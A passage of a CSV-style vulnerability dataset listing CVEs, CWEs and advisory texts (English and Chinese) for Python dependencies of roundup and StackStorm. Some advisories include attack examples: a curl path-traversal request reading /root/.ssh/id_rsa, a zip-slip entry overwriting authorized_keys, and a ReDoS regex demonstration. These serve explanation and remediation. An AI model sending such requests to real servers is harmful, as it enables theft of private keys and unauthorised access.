- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
roundup-tracker_roundup,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
roundup-tracker_roundup,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
roundup-tracker_roundup,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
roundup-tracker_roundup,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
roundup-tracker_roundup,redis,,True,CVE-2023-28858,CWE-193,2023-03-24,"redis-py是基于Python的redis接口库。
redis-py 4.5.3之前版本存在安全漏洞。攻击者利用该漏洞可以将响应数据发送到客户端。",3,0
roundup-tracker_roundup,PyJWT,,True,,CWE-284,2017-12-04,"## Overview
Affected versions of [`pyjwt`](https://pypi.python.org/pypi/pyjwt) are vulnerable to Security Bypass.

when `alg=none` its accept value for the key which could bypass signature verification.

## Remediation
Upgrade `pyjwt` to version 1.0.0 or higher.

## References
- [GitHub Changelog](https://github.com/jpadilla/pyjwt/blob/master/CHANGELOG.md#fixed-12)
- [Github PR](https://github.com/jpadilla/pyjwt/pull/109)
- [Github Commit](https://github.com/jpadilla/pyjwt/commit/88a9fc56bdc6c870aa6af93bda401414a217db2a)
",3,0
roundup-tracker_roundup,PyJWT,,True,CVE-2017-11424,CWE-284,2017-07-19,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。PyJWT是软件开发者Jose Padilla所研发的一个Python中的JSON Web Token实现。

PyJWT 1.5.0及之前的版本中存在安全漏洞。攻击者可利用该漏洞制造JWT。",2,2
roundup-tracker_roundup,Brotli,,True,CVE-2020-8927,CWE-130 CWE-120,2020-09-15,Google brotli Library是谷歌（Google）公司的一种数据压缩算法的扩展库，使用 LZ77 算法、赫夫曼编码和二阶上下文建模的现代变体组合来压缩数据，缓冲区错误漏洞源于未正确验证数据边界。,3,2
roundup-tracker_roundup,Brotli,,True,CVE-2025-6176,CWE-400,2025-10-31,Scrapy 是一个常用的爬虫框架，用于从网站提取数据并处理网络请求。其支持多种压缩算法以提高数据传输效率。漏洞发生在 Brotli 解压缩实现中，Brotli 是一种高效的压缩算法，广泛用于数据压缩和解压场景。该漏洞的成因是 Brotli 解压缩实现中的保护机制未能有效防御解压炸弹攻击，特别是对于由零填充数据组成的高压缩比数据未能进行充分的限制。攻击者可以通过构造特定的 Brotli 压缩数据包，在目标服务器解压时消耗大量内存（需要的内存可能超过 80GB），从而导致系统资源耗尽并引发拒绝服务。,2,2
roundup-tracker_roundup,zstd,,True,CVE-2022-4899,CWE-400,2023-03-31,"Facebook Zstandard是美国Facebook公司的一种开源的无损数据压缩算法。
Zstandard存在安全漏洞，该漏洞源于util.c 中存在缓冲区溢出。",2,2
roundup-tracker_roundup,Jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
roundup-tracker_roundup,Jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
roundup-tracker_roundup,Jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
roundup-tracker_roundup,Jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
roundup-tracker_roundup,Jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
roundup-tracker_roundup,Jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
roundup-tracker_roundup,Jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
roundup-tracker_roundup,Jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
roundup-tracker_roundup,Jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
roundup-tracker_roundup,Jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,flask,,True,CVE-2018-1000656,CWE-20,2018-08-20,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project flask 0.12.3之前版本中存在输入验证漏洞。攻击者可借助JSON数据利用该漏洞造成拒绝服务（大量内存消耗）。",2,2
StackStorm_st2,flask,,True,,CWE-23,2017-09-14,"## Overview
Affected versions of [`flask`](https://pypi.python.org/pypi/Flask) are vulnerable to Arbitrary File Download. A client can use backslashes to escape the directory the files where exposed from.
**Note:** Only if the host server is a windows based operating system.

## References
- [GitHub Changelog](https://github.com/pallets/flask/blob/master/CHANGES)
- [GitHub Commit](https://github.com/pallets/flask/commit/aeed530e3221c1b445c13269dcd2fb67548bcefc)
",4,0
StackStorm_st2,flask,,True,CVE-2023-30861,CWE-539,2023-05-02,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Flask存在安全漏洞，该漏洞源于用于一个客户端的数据响应可能会被缓存并随后由代理发送给其他客户端。",2,1
StackStorm_st2,flask,,True,CVE-2019-1010083,CWE-20,2019-07-17,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project Flask 1.0之前版本中存在资源管理错误漏洞。攻击者可借助特制的被编码的JSON输入利用该漏洞造成拒绝服务。",2,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,setuptools,,True,,CWE-19,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Man-in-the-Middle (MitM) attack.

The ssl.match_hostname function does not properly handle wildcards in hostnames, which might allow man-in-the-middle attackers to spoof servers via a crafted certificate. (same as CVE-2013-7440).

## Remediation
Upgrade `setuptools` to version 1.3 or higher.

## References
- [Pythong Bugs](https://bugs.python.org/issue17997)  
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#13)
- [Github Commit](https://github.com/pypa/setuptools/commit/38fcb3e366ee7a21ff5f0f550fe190b1326fc04b)
",3,0
StackStorm_st2,setuptools,,True,,CWE-399,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Denial of Service (DoS) attacks.

Algorithmic complexity vulnerability in the ssl.match_hostname function, allows remote attackers to cause a denial of service (CPU consumption) via multiple wildcard characters in the common name in a certificate.(same issue as CVE-2013-2099).

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `setuptools` to version 0.9.5 or higher.

## References
- [Python Bugs](https://bugs.python.org/issue17980)
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#095)
- [Github Commit](https://github.com/pypa/setuptools/commit/7ddd872c63a9465340eadae59868d85ac1d43e67)
",3,2
StackStorm_st2,setuptools,,True,,CWE-22,2017-12-04,"## Overview
Affected versions of [`setuptools`](https://pypi.python.org/pypi/setuptools) are vulnerable to Directory Traversal.

`ez_setup._extractall()` doesn't validate the tar file members. `member.name` can start with `/` or to contain `/` which malicious attacker can exploit to Directory Traversal attacks.

## Details
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```


## Remediation
Upgrade `setuptools` to version 3.0 or higher.

## References
- [GitHub Changelog](https://github.com/pypa/setuptools/blob/master/CHANGES.rst#30)
- [Github Issue](https://github.com/pypa/setuptools/issues/7)
- [Github Commit](https://github.com/pypa/setuptools/commit/4c7aaccacb0a756f45862826025bfdd579195d1e)
",3,2
StackStorm_st2,setuptools,,True,CVE-2022-40897,CWE-1333,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Python Packaging Authority (PyPA) setuptools 65.3.0版本及之前版本存在安全漏洞。攻击者利用该漏洞通过特制的HTML包或自定义PackageIndex页面导致拒绝服务。",2,0
StackStorm_st2,setuptools,,True,,CWE-1333,2022-11-14,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within `package.index`.
Exploiting this vulnerability is possible in case the user is fetching malicious HTML from a package in PyPi or a custom `PackageIndex` page.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `setuptools` to version 65.5.1 or higher.
## References
- [GitHub Commit](https://github.com/pypa/setuptools/commit/58e23de0d4c2ce0f2502d072bb9a2ed1e2ab0ba6)
- [GitHub Issue](https://github.com/pypa/setuptools/issues/3659)
",4,0
StackStorm_st2,setuptools,,True,CVE-2013-1633,CWE-20,2013-08-06,"setuptools是Python软件基金会的Python Enterprise Application Kit（PEAK）的一个副项目，它替换了标准的distutils库，并为Python添加了版本化的包和依赖性管理。PEAK是用来在Python中进行快速组件开发和代码重用的框架。
Python setuptools 0.7之前的版本中的easy_install命令中存在安全漏洞，该漏洞源于程序使用HTTP协议对PyPl存储库中的程序包进行检索时，没有对其内容进行完整性检查。中间人攻击者可通过对产品默认使用的特制响应利用该漏洞执行任意代码。",3,0
StackStorm_st2,setuptools,,True,CVE-2024-6345,CWE-94,,setuptools 是一个开源的 Python 库，广泛用于 Python 项目的打包和依赖管理。该库的 package_index 模块在 69.1.1 及之前版本中存在代码注入漏洞。该漏洞源于下载功能的不当控制，该功能允许攻击者通过提供恶意 URL，执行任意命令。虽然由于 easy_install 和 package_index 已被弃用，利用该漏洞的表面已经减少，但仍然存在通过社交工程或对包索引的轻微妥协而实现远程访问的可能性。,2,1
StackStorm_st2,setuptools,,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,setuptools,,True,,,,<p>setuptools 是一个用于 Python 包管理和构建的工具，它简化了包的创建和分发过程。此漏洞的根本原因是使用了已弃用的函数 `tempfile.mktemp()`，该函数不安全，因为在调用 mktemp() 和随后尝试创建文件之间，另一个进程可能会创建一个具有相同名称的文件。这种函数在创建临时文件名时不确保对返回的临时名称的独占访问性，操作之间没有原子性保证，从而为攻击者提供了干扰文件的机会，可能在文件打开之前进行篡改。</p>,3,1
StackStorm_st2,setuptools,<78,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,cryptography,43.0.3,True,CVE-2024-12797,CWE-392,2025-02-11,<p>OpenSSL 是一个用于实现传输层安全（TLS）和安全套接层（SSL）协议的开源软件库，广泛应用于保护互联网通信。漏洞位于文件 ssl/statem/statem_clnt.c 中的函数 tls_post_process_server_rpk，此函数用于在 TLS 握手过程中处理和验证服务器的原始公钥（RPK）。由于在 tls_post_process_server_rpk 函数调用中未充分处理 ssl_verify_rpk 的返回值，导致在 RPK 验证失败的情况下未能及时终止连接，使未经验证的服务器能够继续完成握手过程。攻击者可以利用此缺陷进行中间人攻击，从而截取或篡改通信内容。</p>,3,0
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,setuptools,<78,True,CVE-2025-47273,CWE-22,2025-05-02,setuptools 是一个允许用户下载、构建、安装、升级和卸载 Python 包的软件包。在 78.1.1 版本之前的 setuptools 中，其 `PackageIndex` 存在路径遍历漏洞。,2,0
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
